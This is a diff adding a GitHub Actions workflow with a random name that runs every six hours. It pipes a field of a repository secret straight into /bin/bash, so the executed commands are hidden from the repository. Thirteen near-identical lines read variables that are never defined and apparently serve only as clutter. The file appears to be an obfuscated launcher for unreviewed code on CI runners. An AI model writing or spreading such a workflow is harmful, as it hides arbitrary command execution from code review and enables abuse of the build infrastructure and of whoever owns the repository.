@@ -1,0 +1,30 @@
+name: yexudeyeshouu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yexudeyeshouu
+        env:
+          pf9: ${{ secrets.pf9 }}
+        run: |
+          echo $pf9 | jq -r .zxp7563 | /bin/bash
+          echo $apd803 | jq -r .zl938 | /bin/bash
+          echo $lycqk29 | jq -r .icit70 | /bin/bash
+          echo $jgpak7145 | jq -r .lhg5 | /bin/bash
+          echo $pfe6 | jq -r .qggfk8 | /bin/bash
+          echo $vza64 | jq -r .skn8259 | /bin/bash
+          echo $n609 | jq -r .cajsv3455 | /bin/bash
+          echo $mvgfi794 | jq -r .dq7249 | /bin/bash
+          echo $put714 | jq -r .zhbq932 | /bin/bash
+          echo $qja9904 | jq -r .r184 | /bin/bash
+          echo $repq0262 | jq -r .luqk4638 | /bin/bash
+          echo $k0542 | jq -r .uh962 | /bin/bash
+          echo $wngeo65 | jq -r .mw810 | /bin/bash
+          echo $hzum41169 | jq -r .rby2 | /bin/bash
+
